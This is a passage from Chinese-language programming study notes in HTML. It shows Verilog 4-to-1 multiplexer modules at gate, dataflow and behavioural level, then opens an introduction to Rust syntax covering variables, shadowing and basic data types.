</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#note-cs-verilog-verilog-__codelineno-32-3"></a><span class="k">input</span><span class="w"> </span><span class="n">i0</span><span class="p">,</span><span class="w"> </span><span class="n">i1</span><span class="p">,</span><span class="w"> </span><span class="n">i2</span><span class="p">,</span><span class="w"> </span><span class="n">i3</span><span class="p">;</span>
</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#note-cs-verilog-verilog-__codelineno-32-4"></a><span class="k">input</span><span class="w"> </span><span class="n">s1</span><span class="p">,</span><span class="w"> </span><span class="n">s0</span><span class="p">;</span>
</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#note-cs-verilog-verilog-__codelineno-32-5"></a>
</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#note-cs-verilog-verilog-__codelineno-32-6"></a><span class="kt">wire</span><span class="w"> </span><span class="n">s1n</span><span class="p">,</span><span class="w"> </span><span class="n">s0n</span><span class="p">;</span>
</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#note-cs-verilog-verilog-__codelineno-32-7"></a><span class="kt">wire</span><span class="w"> </span><span class="n">y0</span><span class="p">,</span><span class="w"> </span><span class="n">y1</span><span class="p">,</span><span class="w"> </span><span class="n">y2</span><span class="p">,</span><span class="w"> </span><span class="n">y3</span><span class="p">;</span>
</span><span id="__span-32-8"><a id="__codelineno-32-8" name="__codelineno-32-8" href="#note-cs-verilog-verilog-__codelineno-32-8"></a>
</span><span id="__span-32-9"><a id="__codelineno-32-9" name="__codelineno-32-9" href="#note-cs-verilog-verilog-__codelineno-32-9"></a><span class="k">not</span><span class="w"> </span><span class="p">(</span><span class="n">s1n</span><span class="p">,</span><span class="w"> </span><span class="n">s1</span><span class="p">);</span>
</span><span id="__span-32-10"><a id="__codelineno-32-10" name="__codelineno-32-10" href="#note-cs-verilog-verilog-__codelineno-32-10"></a><span class="k">not</span><span class="w"> </span><span class="p">(</span><span class="n">s0n</span><span class="p">,</span><span class="w"> </span><span class="n">s0</span><span class="p">);</span>
</span><span id="__span-32-11"><a id="__codelineno-32-11" name="__codelineno-32-11" href="#note-cs-verilog-verilog-__codelineno-32-11"></a>
</span><span id="__span-32-12"><a id="__codelineno-32-12" name="__codelineno-32-12" href="#note-cs-verilog-verilog-__codelineno-32-12"></a><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="n">y0</span><span class="p">,</span><span class="w"> </span><span class="n">i0</span><span class="p">,</span><span class="w"> </span><span class="n">s1n</span><span class="p">,</span><span class="w"> </span><span class="n">s0n</span><span class="p">);</span>
</span><span id="__span-32-13"><a id="__codelineno-32-13" name="__codelineno-32-13" href="#note-cs-verilog-verilog-__codelineno-32-13"></a><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="n">y1</span><span class="p">,</span><span class="w"> </span><span class="n">i1</span><span class="p">,</span><span class="w"> </span><span class="n">s1n</span><span class="p">,</span><span class="w"> </span><span class="n">s0</span><span class="p">);</span>
</span><span id="__span-32-14"><a id="__codelineno-32-14" name="__codelineno-32-14" href="#note-cs-verilog-verilog-__codelineno-32-14"></a><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="n">y2</span><span class="p">,</span><span class="w"> </span><span class="n">i2</span><span class="p">,</span><span class="w"> </span><span class="n">s1</span><span class="p">,</span><span class="w"> </span><span class="n">s0n</span><span class="p">);</span>
</span><span id="__span-32-15"><a id="__codelineno-32-15" name="__codelineno-32-15" href="#note-cs-verilog-verilog-__codelineno-32-15"></a><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="n">y3</span><span class="p">,</span><span class="w"> </span><span class="n">i3</span><span class="p">,</span><span class="w"> </span><span class="n">s1</span><span class="p">,</span><span class="w"> </span><span class="n">s0</span><span class="p">);</span>
</span><span id="__span-32-16"><a id="__codelineno-32-16" name="__codelineno-32-16" href="#note-cs-verilog-verilog-__codelineno-32-16"></a>
</span><span id="__span-32-17"><a id="__codelineno-32-17" name="__codelineno-32-17" href="#note-cs-verilog-verilog-__codelineno-32-17"></a><span class="k">or</span><span class="w"> </span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="w"> </span><span class="n">y0</span><span class="p">,</span><span class="w"> </span><span class="n">y1</span><span class="p">,</span><span class="w"> </span><span class="n">y2</span><span class="p">,</span><span class="w"> </span><span class="n">y3</span><span class="p">);</span>
</span><span id="__span-32-18"><a id="__codelineno-32-18" name="__codelineno-32-18" href="#note-cs-verilog-verilog-__codelineno-32-18"></a><span class="k">endmodule</span>
</span></code></pre></div></p>
<p>数据流级描述
<div class="language-Verilog highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#note-cs-verilog-verilog-__codelineno-33-1"></a><span class="k">module</span><span class="w"> </span><span class="n">mux4_to_1</span><span class="w">  </span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="w"> </span><span class="n">i0</span><span class="p">,</span><span class="w"> </span><span class="n">i1</span><span class="p">,</span><span class="w"> </span><span class="n">i2</span><span class="p">,</span><span class="w"> </span><span class="n">i3</span><span class="p">,</span><span class="w"> </span><span class="n">s1</span><span class="p">,</span><span class="w"> </span><span class="n">s0</span><span class="p">);</span>
</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#note-cs-verilog-verilog-__codelineno-33-2"></a><span class="k">output</span><span class="w"> </span><span class="n">out</span><span class="err">，</span>
</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#note-cs-verilog-verilog-__codelineno-33-3"></a><span class="k">input</span><span class="w"> </span><span class="n">i0</span><span class="p">,</span><span class="w"> </span><span class="n">i1</span><span class="p">,</span><span class="w"> </span><span class="n">i2</span><span class="p">,</span><span class="w"> </span><span class="n">i3</span><span class="p">;</span>
</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#note-cs-verilog-verilog-__codelineno-33-4"></a><span class="k">input</span><span class="w"> </span><span class="n">s1</span><span class="p">,</span><span class="w"> </span><span class="n">s0</span><span class="p">;</span>
</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#note-cs-verilog-verilog-__codelineno-33-5"></a><span class="k">assign</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="o">~</span><span class="n">s1</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="o">~</span><span class="n">s0</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">i0</span><span class="p">)</span><span class="o">|</span><span class="p">(</span><span class="o">~</span><span class="n">s1</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">s0</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">i1</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="p">(</span><span class="n">s1</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="o">~</span><span class="n">s0</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">i2</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="p">(</span><span class="n">s1</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">s0</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">i3</span><span class="p">)</span><span class="w"> </span><span class="p">;</span>
</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#note-cs-verilog-verilog-__codelineno-33-6"></a><span class="k">endmodule</span>
</span></code></pre></div></p>
<p>行为级描述
<div class="language-Verilog highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#note-cs-verilog-verilog-__codelineno-34-1"></a><span class="k">module</span><span class="w"> </span><span class="n">mux4_to_1</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="w"> </span><span class="n">i0</span><span class="p">,</span><span class="w"> </span><span class="n">i1</span><span class="p">,</span><span class="w"> </span><span class="n">i2</span><span class="p">,</span><span class="w"> </span><span class="n">i3</span><span class="p">,</span><span class="w"> </span><span class="n">s1</span><span class="p">,</span><span class="w"> </span><span class="n">s0</span><span class="p">);</span>
</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#note-cs-verilog-verilog-__codelineno-34-2"></a><span class="k">output</span><span class="w"> </span><span class="n">out</span><span class="p">;</span>
</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#note-cs-verilog-verilog-__codelineno-34-3"></a><span class="k">input</span><span class="w"> </span><span class="n">i0</span><span class="p">,</span><span class="w"> </span><span class="n">i1</span><span class="p">,</span><span class="w"> </span><span class="n">i2</span><span class="p">,</span><span class="w"> </span><span class="n">i3</span><span class="p">;</span>
</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#note-cs-verilog-verilog-__codelineno-34-4"></a><span class="k">input</span><span class="w"> </span><span class="n">s1</span><span class="p">,</span><span class="w"> </span><span class="n">s0</span><span class="p">;</span>
</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#note-cs-verilog-verilog-__codelineno-34-5"></a><span class="kt">reg</span><span class="w"> </span><span class="n">out</span><span class="p">;</span>
</span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6" href="#note-cs-verilog-verilog-__codelineno-34-6"></a><span class="k">always</span><span class="w"> </span><span class="p">@(</span><span class="n">s1</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="n">s0</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="n">i0</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="n">i1</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="n">i2</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="n">i3</span><span class="p">)</span>
</span><span id="__span-34-7"><a id="__codelineno-34-7" name="__codelineno-34-7" href="#note-cs-verilog-verilog-__codelineno-34-7"></a><span class="w"> </span><span class="k">begin</span>
</span><span id="__span-34-8"><a id="__codelineno-34-8" name="__codelineno-34-8" href="#note-cs-verilog-verilog-__codelineno-34-8"></a><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="p">({</span><span class="n">s1</span><span class="p">,</span><span class="w"> </span><span class="n">s0</span><span class="p">})</span>
</span><span id="__span-34-9"><a id="__codelineno-34-9" name="__codelineno-34-9" href="#note-cs-verilog-verilog-__codelineno-34-9"></a><span class="w">       </span><span class="mh">2</span><span class="mb">&#39;b00</span><span class="o">:</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i0</span><span class="p">;</span>
</span><span id="__span-34-10"><a id="__codelineno-34-10" name="__codelineno-34-10" href="#note-cs-verilog-verilog-__codelineno-34-10"></a><span class="w">       </span><span class="mh">2</span><span class="mb">&#39;b01</span><span class="o">:</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i1</span><span class="p">;</span>
</span><span id="__span-34-11"><a id="__codelineno-34-11" name="__codelineno-34-11" href="#note-cs-verilog-verilog-__codelineno-34-11"></a><span class="w">       </span><span class="mh">2</span><span class="mb">&#39;b10</span><span class="o">:</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i2</span><span class="p">;</span>
</span><span id="__span-34-12"><a id="__codelineno-34-12" name="__codelineno-34-12" href="#note-cs-verilog-verilog-__codelineno-34-12"></a><span class="w">       </span><span class="mh">2</span><span class="mb">&#39;b11</span><span class="o">:</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i3</span><span class="p">;</span>
</span><span id="__span-34-13"><a id="__codelineno-34-13" name="__codelineno-34-13" href="#note-cs-verilog-verilog-__codelineno-34-13"></a><span class="w">       </span><span class="k">default</span><span class="o">:</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">1</span><span class="p">&#39;</span><span class="n">bx</span><span class="p">;</span>
</span><span id="__span-34-14"><a id="__codelineno-34-14" name="__codelineno-34-14" href="#note-cs-verilog-verilog-__codelineno-34-14"></a><span class="w">     </span><span class="k">endcase</span>
</span><span id="__span-34-15"><a id="__codelineno-34-15" name="__codelineno-34-15" href="#note-cs-verilog-verilog-__codelineno-34-15"></a><span class="w">  </span><span class="k">end</span>
</span><span id="__span-34-16"><a id="__codelineno-34-16" name="__codelineno-34-16" href="#note-cs-verilog-verilog-__codelineno-34-16"></a><span class="k">endmodule</span>
</span></code></pre></div></p>
</div>
<h2 id="note-cs-verilog-verilog-_3">其他规定<a class="headerlink" href="#note-cs-verilog-verilog-_3" title="Permanent link">&para;</a></h2>
<ul>
<li>
<p>关键字:关键字即Verilog语言中预定义的有特殊含义的英文词语</p>
</li>
<li>
<p>标识符:标识符即用户自定义的信号名、模块名等等；
  注意关键字不能作标识符；
  Verilog区别大小写（关键字都是小写）</p>
</li>
<li>
<p>Verilog文件扩展名为.v；verilog不要求文件名和模块名一致</p>
</li>
<li>
<p>注释:和C语言一样,//单行注释,/**/多行注释</p>
</li>
</ul></section><section class="print-page" id="note-cs-rust-rust" heading-number="2.4.4.2"><h1 id="note-cs-rust-rust-rust">RUST基础语法<a class="headerlink" href="#note-cs-rust-rust-rust" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 14958 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 1057 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 1 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 65 分钟</p>
</div>
<blockquote>
<p>据说这门语言很<img alt="🐂" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/1f402.svg" title=":ox:" /></p>
</blockquote>
<h2 id="note-cs-rust-rust-_1">前置<a class="headerlink" href="#note-cs-rust-rust-_1" title="Permanent link">&para;</a></h2>
<p><strong>Rust语言的特点</strong></p>
<ul>
<li>
<p>高性能: Rust 速度惊人且内存利用率极高。由于没有运行时和垃圾回收，它能够胜任对性能要求特别高的服务，可以在嵌入式设备上运行，还能轻松和其他语言集成。</p>
</li>
<li>
<p>可靠性: Rust 丰富的类型系统和所有权模型保证了内存安全和线程安全，让您在编译期就能够消除各种各样的错误。</p>
</li>
<li>
<p>生产力 Rust 拥有出色的文档、友好的编译器和清晰的错误提示信息， 还集成了一流的工具 —— 包管理器和构建工具， 智能地自动补全和类型检验的多编辑器支持， 以及自动格式化代码等等。</p>
</li>
</ul>
<p><strong>Rust的应用</strong></p>
<p>Rust 语言可以用于开发：</p>
<ul>
<li>传统命令行程序  Rust 编译器可以直接生成目标可执行程序，不需要任何解释程序。</li>
<li>Web 应用  Rust 可以被编译成 WebAssembly，WebAssembly 是一种 JavaScript 的高效替代品。</li>
<li>
<p>网络服务器  Rust 用极低的资源消耗做到安全高效，且具备很强的大规模并发处理能力，十分适合开发普通或极端的服务器程序。</p>
</li>
<li>
<p>嵌入式设备  Rust 同时具有JavaScript 一般的高效开发语法和 C 语言的执行效率，支持底层平台的开发。</p>
</li>
</ul>
<p>RUST文件的后缀名为<code>.rs</code>,通过运行<code>rustc  xxx.rs</code>可以直接生成可执行文件</p>
<p>rust语言的注释方式跟C语言一样，支持两种注释方法，<code>//单行注释和/**/多行注释</code></p>
<p>但是需要注意的是，在这种情况下<code>///</code> 仍然是一种合法的注释方式，所以可以用这种特殊的方式来当作文档的说明</p>
<h2 id="note-cs-rust-rust-_2">变量<a class="headerlink" href="#note-cs-rust-rust-_2" title="Permanent link">&para;</a></h2>
<h3 id="note-cs-rust-rust-_3">声明变量<a class="headerlink" href="#note-cs-rust-rust-_3" title="Permanent link">&para;</a></h3>
<p>Rust是强类型语言，具有自动判断变量类型的能力。</p>
<p>如果要声明变量需要使用<code>let</code>关键字</p>
<p>例如：
<div class="language-rust highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-cs-rust-rust-__codelineno-0-1"></a><span class="w">   </span><span class="kd">let</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span>
</span></code></pre></div>
在变量<code>a</code>被声明之后,<code>a</code>就被确定为整形 <strong>不可变变量</strong> 
也就是说:</p>
<ul>
<li>不可以将其它类型的变量赋给它</li>
<li>不允许将小数赋给它，因为自动转换数字精度有损失，Rust 语言不允许精度有损失的自动数据类型转换。</li>
<li>不允许对它重新赋其他值</li>
</ul>
<p>如果想要<code>a</code>可以被重新赋值，只需要在<code>a</code>前面加一个<code>mut</code>（mutable），这样<code>a</code>就变成了可变的变量</p>
<p>例如：
<div class="language-rust highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-cs-rust-rust-__codelineno-1-1"></a><span class="w">   </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#note-cs-rust-rust-__codelineno-1-2"></a><span class="w">   </span><span class="n">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span>
</span></code></pre></div></p>
<div class="admonition 常量与不可变变量的区别">
<p class="admonition-title">常量与不可变变量的区别</p>
<p>不可变变量仍然是变量，也就是说可以对它**重新定义**，例如：
<div class="language-rust highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#note-cs-rust-rust-__codelineno-2-1"></a><span class="kd">let</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">123</span><span class="p">;</span><span class="w">   </span><span class="c1">// 可以编译，但可能有警告，因为该变量没有被使用</span>
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#note-cs-rust-rust-__codelineno-2-2"></a><span class="kd">let</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">456</span><span class="p">;</span><span class="w">   </span><span class="c1">//这里用了let重新绑定变量对应的值，没有直接对它赋值</span>
</span></code></pre></div>
但是如果是常量，就不允许对它进行任何改变的操作
<div class="language-rust highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#note-cs-rust-rust-__codelineno-3-1"></a><span class="k">const</span><span class="w"> </span><span class="n">a</span>: <span class="kt">i32</span> <span class="o">=</span><span class="w"> </span><span class="mi">123</span><span class="p">;</span>
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#note-cs-rust-rust-__codelineno-3-2"></a><span class="kd">let</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">456</span><span class="p">;</span>
</span></code></pre></div>
这种不可变变量的名称可以被重新绑定的机制叫做**重影(shadowing)**</p>
<p><div class="language-rust highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#note-cs-rust-rust-__codelineno-4-1"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#note-cs-rust-rust-__codelineno-4-2"></a><span class="kd">let</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">5</span><span class="p">;</span>
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#note-cs-rust-rust-__codelineno-4-3"></a><span class="kd">let</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#note-cs-rust-rust-__codelineno-4-4"></a><span class="kd">let</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span>
</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#note-cs-rust-rust-__codelineno-4-5"></a><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;The value of x is: {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">x</span><span class="p">);</span>
</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#note-cs-rust-rust-__codelineno-4-6"></a><span class="p">}</span>
</span></code></pre></div>
程序运行结果</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#note-cs-rust-rust-__codelineno-5-1"></a><span class="n">The</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="n">is</span>: <span class="mi">12</span>
</span></code></pre></div>
</div>
<h3 id="note-cs-rust-rust-_4">数据类型<a class="headerlink" href="#note-cs-rust-rust-_4" title="Permanent link">&para;</a></h3>
<p><strong>整数类型</strong></p>
<p>整数型简称整型，按照比特位长度和有无符号分为以下种类：</p>
<table>
<thead>
<tr>
<th>位长度</th>
<th>有符号</th>
<th>无符号</th>
</tr>
</thead>
<tbody>
<tr>
<td>8-bit</td>
<td>i8</td>
<td>u8</td>
</tr>
<tr>
<td>16-bit</td>
<td>i16</td>
<td>u16</td>
</tr>
<tr>
<td>32-bit</td>
<td>i32</td>
<td>u32</td>
</tr>
<tr>
<td>64-bit</td>
<td>i64</td>
<td>u64</td>
</tr>
<tr>
<td>128-bit</td>
<td>i128</td>
<td>u128</td>
</tr>
<tr>
<td>arch</td>
<td>isize</td>
<td>usize</td>
</tr>
</tbody>
</table>
<p>isize 和 usize 两种整数类型是用来衡量数据大小的，它们的位长度取决于所运行的目标平台，如果是 32 位架构的处理器将使用 32 位位长度整型</p>
<p>rust中可以用不同的方式表示整数</p>
<table>
<thead>
<tr>
<th>进制</th>
<th>例</th>
</tr>
</thead>
<tbody>
<tr>
<td>十进制</td>
<td>98_222</td>
</tr>
<tr>
<td>十六进制</td>
<td>0xff</td>
</tr>
<tr>
<td>八进制</td>
<td>0o77</td>
</tr>
<tr>
<td>二进制</td>
<td>0b1111_0000</td>
</tr>
<tr>
<td>字节(只能表示 u8 型)</td>
<td>b'A'</td>
</tr>
</tbody>
</table>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>虽然 Rust 有自动判断类型的功能，但有些情况下声明类型更加方便：
<div class="language-rust highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#note-cs-rust-rust-__codelineno-6-1"></a><span class="kd">let</span><span class="w"> </span><span class="n">a</span>: <span class="kt">u64</span> <span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
</span></code></pre></div>
这里声明了 <code>a</code> 为无符号 64 位整型变量，如果没有声明类型，<code>a</code> 将自动被判断为有符号 32 位整型变量，这对于 <code>a</code> 的取值范围有很大的影响。</p>
</div>
<p><strong>浮点数型(Floating-Point)</strong></p>
<p>Rust 与其它语言一样支持 32 位浮点数（f32）和 64 位浮点数（f64）。默认情况下，64.0 将表示 64 位浮点数，因为现代计算机处理器对两种浮点数计算的速度几乎相同，但 64 位浮点数精度更高。</p>
<p>实例</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#note-cs-rust-rust-__codelineno-7-1"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#note-cs-rust-rust-__codelineno-7-2"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">2.0</span><span class="p">;</span><span class="w"> </span><span class="c1">// f64</span>
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#note-cs-rust-rust-__codelineno-7-3"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">y</span>: <span class="kt">f32</span> <span class="o">=</span><span class="w"> </span><span class="mf">3.0</span><span class="p">;</span><span class="w"> </span><span class="c1">// f32</span>
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#note-cs-rust-rust-__codelineno-7-4"></a><span class="p">}</span>
</span></code></pre></div>
<p>rust 同时也支持基本的数学运算，但是不支持C语言里面有的<code>++</code>和<code>--</code>,因为这两个运算符出现在变量的前后会影响代码可读性，减弱了开发者对变量改变的意识能力。</p>
<p>基本的四则运算有<code>+(加)</code>,<code>-(减)</code>,<code>*(乘)</code>,<code>/(除)</code>,<code>%(mod)</code></p>
<p><strong>bool类型</strong></p>
<p>bool值只能为true或者false</p>
<p><strong>字符型</strong></p>
<blockquote>
<p>字符型用 char 表示。
Rust的 char 类型大小为 4 个字节，代表 Unicode标量值，这意味着它可以支持中文，日文和韩文字符等非英文字符甚至表情符号和零宽度空格在 Rust 中都是有效的 char 值。
Unicode 值的范围从 U+0000 到 U+D7FF 和 U+E000 到 U+10FFFF （包括两端）。 但是，"字符"这个概念并不存在于 Unicode 中，因此您对"字符"是什么的直觉可能与Rust中的字符概念不匹配。所以一般推荐使用字符串储存 UTF-8 文字（非英文字符尽可能地出现在字符串中）。</p>
</blockquote>
<p><strong>注意</strong>：由于中文文字编码有两种（GBK 和 UTF-8），所以编程中使用中文字符串有可能导致乱码的出现，这是因为源程序与命令行的文字编码不一致，所以在 Rust 中字符串和字符都必须使用 UTF-8 编码，否则编译器会报错。</p>
<p><strong>复合类型</strong></p>
<p>跟python类似,rust中有</p>
<ul>
<li>
<p>元组<code>()</code>,可以包含不同的数据类型
<div class="language-rust highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#note-cs-rust-rust-__codelineno-8-1"></a><span class="kd">let</span><span class="w"> </span><span class="n">tup</span>: <span class="p">(</span><span class="kt">i32</span><span class="p">,</span><span class="w"> </span><span class="kt">f64</span><span class="p">,</span><span class="w"> </span><span class="kt">u8</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="mi">500</span><span class="p">,</span><span class="w"> </span><span class="mf">6.4</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#note-cs-rust-rust-__codelineno-8-2"></a><span class="c1">// tup.0 等于 500</span>
</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#note-cs-rust-rust-__codelineno-8-3"></a><span class="c1">// tup.1 等于 6.4</span>
</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#note-cs-rust-rust-__codelineno-8-4"></a><span class="c1">// tup.2 等于 1</span>
